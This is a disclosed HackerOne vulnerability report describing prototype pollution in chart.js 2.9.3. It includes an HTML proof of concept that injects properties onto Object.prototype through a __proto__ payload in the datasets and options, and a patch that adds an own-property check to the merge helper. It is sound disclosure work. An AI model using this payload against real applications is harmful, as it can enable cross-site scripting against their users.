# [chart.js] Prototype pollution

## Report Details
- **Report ID**: 776371
- **URL**: https://hackerone.com/reports/776371
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-01-16T12:28:44.719Z
- **Disclosed**: 2020-12-02T23:14:03.894Z

## Reporter
- **Username**: asgerf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a prototype pollution vulnerability in chart.js
It allows an attacker to inject properties on Object.prototype which can for some applications lead to XSS.

# Module

**module name:** chart.js
**version:** 2.9.3
**npm page:** `https://www.npmjs.com/package/chart.js`

## Module Description

Simple yet flexible JavaScript charting for designers & developers

## Module Stats

854,171 weekly downloads

# Vulnerability

## Vulnerability Description

If the `dataset` or `options` passed to Chart.js contains an attacker-controlled object, Chart.js can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

The payload is an object with the `__proto__` property.

## Steps To Reproduce:

Install chart.js 2.9.3 into node_modules and then view the following HTML page and check the log:
```html
        <canvas id="canvas"></canvas>
        <script src="node_modules/chart.js/dist/Chart.bundle.js"></script>
        <script>
            var ctx = document.getElementById('canvas').getContext('2d');
            var chart = new Chart(ctx, {
                type: 'line',
                data: {
                    labels: ['January', 'February', 'March', 'April', 'May'],
                    datasets: [{
                        label: 'My First dataset',
                        backgroundColor: 'rgb(255, 99, 132)',
                        borderColor: 'rgb(255, 99, 132)',
                        data: [0, 10, 5, 2, 20]
                    },
                    JSON.parse(`{"__proto__": {"abc": "Injected value through dataset"}}`)
                    ]
                },
                options: JSON.parse(`{"__proto__": {"def": "Injected value through options"}}`)
            });
            console.log({}.abc); // Print "Injected value through dataset"
            console.log({}.def); // Print "Injected value through options"
        </script>
```

## Patch

Avoid recursively merging properties that aren't already own properties of the target object:

```
diff --git a/src/helpers/helpers.core.js b/src/helpers/helpers.core.js
index 100d4edf..b5127025 100644
--- a/src/helpers/helpers.core.js
+++ b/src/helpers/helpers.core.js
@@ -226,7 +226,7 @@ export function _merger(key, target, source, options) {
 	var tval = target[key];
 	var sval = source[key];

-	if (isObject(tval) && isObject(sval)) {
+	if (Object.prototype.hasOwnProperty.call(target, key) && isObject(tval) && isObject(sval)) {
 		// eslint-disable-next-line no-use-before-define
 		merge(tval, sval, options);
 	} else {
```

## Supporting Material/References:

Tested Chart.js 2.9.3 in Chrome 79

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Inject properties on Object.prototype which can for some applications lead to XSS.

## Attachments
No attachments
